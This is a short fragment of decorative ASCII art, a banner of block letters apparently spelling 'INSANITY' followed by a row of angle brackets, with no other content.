III  NN     NNN  SSSSSSSSS  AA   AA  NN     NNN  III     TT         YY

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>




